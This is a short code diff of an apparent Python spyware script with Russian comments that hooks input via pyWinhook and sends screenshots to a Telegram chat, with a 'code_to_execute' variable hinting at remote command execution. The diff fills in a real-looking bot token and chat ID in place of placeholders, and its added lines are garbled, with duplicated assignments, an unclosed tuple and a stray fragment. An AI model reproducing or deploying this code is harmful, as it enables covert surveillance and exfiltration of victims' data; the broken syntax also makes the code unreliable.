@@ -13,12 +13,16 @@ import ctypes
 import pyWinhook as pyHook
 import pythoncom
 
-token = 'YOUR_TELEGRAM_BOT_TOKEN' # Замените на ваш токен бота
+token = '6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U' # Замените на ваш токен бота
 bot = telebot.TeleBot(token)
-chat_id = YOUR_CHAT_ID # Замените на ваш ID чата
+chat_id = 1882056354 # Замените на ваш ID чата
 
-telegram_bot_token = "YOUR_TELEGRAM_BOT_TOKEN" # Замените на ваш токен бота
+telegram_bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U" # Замените на ваш токен бота
+chat_ids = (1882056354 # Замените на ваш ID чата
+
+telegram_bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U" # Замените на ваш токен бота
 chat_ids = (YOUR_CHAT_ID,) # Замените на ваш ID чата
+code_to_execute,) # Замените на ваш ID чата
 code_to_execute = ''
 
 def send_message_to_group(chat_id, screenshot):
